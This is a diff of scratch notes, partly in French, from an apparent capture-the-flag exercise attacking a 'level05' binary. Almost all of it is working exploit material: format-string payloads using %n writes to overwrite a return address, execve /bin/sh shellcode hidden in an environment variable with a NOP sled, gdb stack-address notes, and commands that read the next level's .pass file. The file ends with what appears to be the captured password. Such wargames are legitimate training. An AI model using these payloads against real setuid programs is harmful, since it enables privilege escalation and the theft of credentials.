@@ -196,3 +196,147 @@ echo $(echo $(unset $(env | cut -d= -f1); export F=$(/usr/bin/python -c "print( 
 					/usr/bin/python -c "print('\xff\xff\xdd\x6c'[::-1]  + 'a'*4 + '\xff\xff\xdd\x6d'[::-1] + 'a'*4 + '\xff\xff\xdd\x6e'[::-1] + '\xff\xff\xdd\x6f'[::-1]+'%15.x'*9+'a'*4+'%n'+'%60.c'+'%n' + '%32.c' + '%n' + '%n')";
 					/bin/echo '/bin/cat /home/users/level06/.pass'
 				) | /home/users/level05/level05 ))
+
+array = 0xffffd698
+
+ecit jmp = 0x804837b 
+need 0x804837b+1
+
+'\x08\x04\x83\x7b'[::-1]
+
+0x58    0xfe    0xff    0xff
+
+
+
+echo $(echo $(unset $(env | cut -d= -f1); (/usr/bin/python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + ''[::-1])" ; /bin/echo '/bin/cat /home/users/level06/.pass') | /home/users/level05/level05 ))
+
+ <<< $(/usr/bin/python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')")
+
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+
+
+gcc -m32  -fno-stack-protector -z execstack script.c
+
+
+080483d4 <_>:
+ 80483d4:       55                      push   %ebp
+ 80483d5:       89 e5                   mov    %esp,%ebp
+ 80483d7:       83 ec 58                sub    $0x58,%esp
+ 80483da:       8d 45 b9                lea    -0x47(%ebp),%eax
+ 80483dd:       89 04 24                mov    %eax,(%esp)
+ 80483e0:       e8 0b ff ff ff          call   80482f0 <gets@plt>
+ 80483e5:       8d 45 b9                lea    -0x47(%ebp),%eax
+ 80483e8:       ff d0                   call   *%eax
+ 80483ea:       c9                      leave
+ 80483eb:       c3                      ret
+
+
+\x83\xec\x20\x8d\x45\xb9\x89\x04\x24\xe8\x0b\xff\xff\xff\x8d\x45\xb9\xff\xd0
+
+
+<<< $(/usr/bin/python -c "print('\x83\xec\x20\x8d\x45\xb9\x89\x04\x24\xe8\x0b\xff\xff\xff\x8d\x45\xb9\xff\xd0')")
+
+
+<<< $(printf "\x7c\x63\x1a\x79\x38\xa0\x04\x04\x30\x05\xfb\xff\x7c\x24\x0b\x78\x44\xde\xad\xf2\x69\x69\x69\x69\x7c\x29\x03\xa6\x4e\x80\x04\x21")
+
+
+
+	////////////////////
+	/////// ALAN ///////
+	////////////////////
+
+
+enregistrer exploit dans env (taille 24):
+	export f=$(printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")
+
+printf ret address:
+	(gdb) 0xffffdd5c
+
+	(real) 0xffffdd6c ?
+
+
+	value of ret addr =  0x0804850c
+
+
+! 100 octets max en entree !
+!   >64 && <=90 interdit   !
+
+setup gdb:
+	unset environment
+	set environment f="01234567890123456789012345678901"
+
+Trouver env rapidement:
+	dans main apres:
+		x/256s $esp
+
+		0xffffdf7b:      "/home/users/level05/level05"
+		0xffffdf97:      "PWD=/home/users/level05"
+		0xffffdfaf:      "f=01234567890123456789012345678901"
+		0xffffdfd4:      "SHLVL=0"
+		0xffffdfdc:      "/home/users/level05/level05"
+
+test1:
+	r <<< $(python -c "print('\x6c\xdd\xff\xff' + 'A'*4 + '\x88\x88\x88\x88' + 'A'*4 + '\x88\x88\x88\x88' + '\x88\x88\x88\x88' + '%8.x' * 9 + '%n')")
+
+test2:
+	echo $(echo $(unset $(env | cut -d= -f1); export f="01234567890123456789012345678901"; (/usr/bin/python -c "print('\xaf\xdf\xff\xff' + 'A'*4 + '\x88\x88\x88\x88' + 'A'*4 + '\x88\x88\x88\x88' + '\x88\x88\x88\x88' + '%8.x' * 9 + '%n')") | ./level05))
+
+test3:
+	echo $(echo $(unset $(env | cut -d= -f1); export f="01234567890123456789012345678901"; (/usr/bin/python -c "print('\x6c\xdd\xff\xff' + 'A'*4 + '\x88\x88\x88\x88' + 'A'*4 + '\x88\x88\x88\x88' + '\x88\x88\x88\x88' + '%9.x'*8+'%x'*2 + '%n')") | ./level05))
+
+veux injecter:
+	0xffffdfbf ? devinée grace à printf '%s'
+
+
+test4: (segfault car corromp stack vprintf)
+	echo $(echo $(unset $(env | cut -d= -f1); export f=012345678901234567890123 ; (/usr/bin/python -c "print('\x6c\xdd\xff\xff' + 'A'*4 + '\x6d\xdd\xff\xff' + 'A'*4 + 'x6e\xdd\xff\xff' + 'x6f\xdd\xff\xff' + '%9.x'*8+'%95.c' + '%n' + '%32.c' + '%n' + '%32.c' + '%n')") | ./level05))
+
+nb chars:
+	4*6 + 4*8 + 5 + 2 + 5 + 2 + 5 + 2 = 77
+
+
+echo $(echo $(unset $(env | cut -d= -f1); export f=$(/usr/bin/printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'); (/usr/bin/python -c "print('\x6c\xdd\xff\xff' + 'A'*4 + '\x6d\xdd\xff\xff' + 'A'*4 + '\x6e\xdd\xff\xff' + '\x6f\xdd\xff\xff' + '%9.x'*8+'%107.c' + '%n' + '%20.c' + '%n' + '%32.c' + '%n' + '%n')"; /bin/echo '/bin/cat /home/user/level06/.pass') | ./level05))
+
+
+theoriquement gdb correct:
+	echo $(echo $(unset $(env | cut -d= -f1); export f=$(/usr/bin/printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'); (/usr/bin/python -c "print('\x6c\xdd\xff\xff' + 'A'*4 + '\x6d\xdd\xff\xff' + 'A'*4 + '\x6e\xdd\xff\xff' + '\x6f\xdd\xff\xff' + '%9.x'*8+'%105.c' + '%n' + '%22.c' + '%n' + '%32.c' + '%n' + '%n')"; /bin/echo '/bin/cat /home/user/level06/.pass') | ./level05))
+
+
+add offset:
+	echo $(echo $(unset $(env | cut -d= -f1); export f=$(/usr/bin/printf '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'); (/usr/bin/python -c "print('\x6c\xdd\xff\xff' + 'A'*4 + '\x6d\xdd\xff\xff' + 'A'*4 + '\x6e\xdd\xff\xff' + '\x6f\xdd\xff\xff' + '%9.x'*8+'%105.c' + '%n' + '%22.c' + '%n' + '%32.c' + '%n' + '%n')"; /bin/echo '/bin/cat /home/user/level06/.pass') | ./level05))
+
+
+decal ret addr -16 pour env +grand (28 -> 40):
+	echo $(echo $(unset $(env | cut -d= -f1); export f=$(/usr/bin/printf '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'); (/usr/bin/python -c "print('\x5c\xdd\xff\xff' + 'A'*4 + '\x5d\xdd\xff\xff' + 'A'*4 + '\x5e\xdd\xff\xff' + '\x5f\xdd\xff\xff' + '%9.x'*8+'%089.c' + '%n' + '%38.c' + '%n' + '%32.c' + '%n' + '%n')"; /bin/echo '/bin/cat /home/user/level06/.pass') | /home/users/level05/level05))
+
+
+///////////////////////////////////////
+
+addr env &f:
+	0xffffdfa9
+
+echo $(echo $(unset $(env | cut -d= -f1); export f=$(/usr/bin/printf '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'); (/usr/bin/python -c "print('\xa9\xdf\xff\xff' + 'A'*4 + '\x6d\xdd\xff\xff' + 'A'*4 + '\x6e\xdd\xff\xff' + '\x6f\xdd\xff\xff' + '%9.x'*8+'%089.c' + '%s' + '%38.c' + '%%' + '%32.c' + '%%' + '%%')"; /bin/echo '/bin/cat /home/user/level06/.pass') | /home/users/level05/level05))
+
+echo $(echo $(unset $(env | cut -d= -f1); export f=$(/usr/bin/printf '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'); (/usr/bin/python -c "print('\x93\xdf\xff\xff' + 'A'*4 + '\x6d\xdd\xff\xff' + 'A'*4 + '\x6e\xdd\xff\xff' + '\x6f\xdd\xff\xff' + '%9.x'*8+'%089.c' + '%s' + '%38.c' + '%%' + '%32.c' + '%%' + '%%')"; /bin/echo '/bin/cat /home/user/level06/.pass') | /home/users/level05/level05))
+
+
+
+(gdb)	0xffffdfb9 - 0x16 (18)
+(real)	0xffffdfa3
+
+echo $(echo $(unset $(env | cut -d= -f1); export f=$(/usr/bin/printf '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'); (/usr/bin/python -c "print('\x5c\xdd\xff\xff' + 'A'*4 + '\x5d\xdd\xff\xff' + 'A'*4 + '\x5e\xdd\xff\xff' + '\x5f\xdd\xff\xff' + '%9.x'*8+'%51.c' + '%n' + '%76.c' + '%n' + '%32.c' + '%n' + '%n')"; /bin/echo '/bin/cat /home/user/level06/.pass') | /home/users/level05/level05))
+
+
+FIRST1:
+	echo $(echo $(unset $(env | cut -d= -f1); export f=$(/usr/bin/printf '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'); (/usr/bin/python -c "print('\x5c\xdd\xff\xff' + 'A'*4 + '\x5d\xdd\xff\xff' + 'A'*4 + '\x5e\xdd\xff\xff' + '\x5f\xdd\xff\xff' + '%9.x'*8+'%51.c' + '%n' + '%76.c' + '%n' + '%32.c' + '%n' + '%n')"; /bin/echo '/bin/cat /home/user/level06/.pass') | /home/users/level05/level05))
+
+////////// NEW //////////
+
+echo $(echo $(unset $(env | cut -d= -f1); export f=$(/usr/bin/printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'); (/usr/bin/python -c "print('\x6c\xdd\xff\xff' + 'A'*4 + '\x6d\xdd\xff\xff' + 'A'*4 + '\x6e\xdd\xff\xff' + '\x6f\xdd\xff\xff' + '%9.x'*8+'%67.c' + '%n' + '%60.c' + '%n' + '%32.c' + '%n' + '%n')"; /bin/echo '/bin/cat /home/user/level06/.pass') | /home/users/level05/level05))
+
+//// OFF-16 RET ADDR: ////
+
+echo $(echo $(unset $(env | cut -d= -f1); export f=$(/usr/bin/printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'); (/usr/bin/python -c "print('\x5c\xdd\xff\xff' + 'A'*4 + '\x5d\xdd\xff\xff' + 'A'*4 + '\x5e\xdd\xff\xff' + '\x5f\xdd\xff\xff' + '%9.x'*8+'%69.c' + '%n' + '%58.c' + '%n' + '%32.c' + '%n' + '%n')"; /bin/echo '/bin/cat /home/users/level06/.pass') | /home/users/level05/level05))
+
+
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
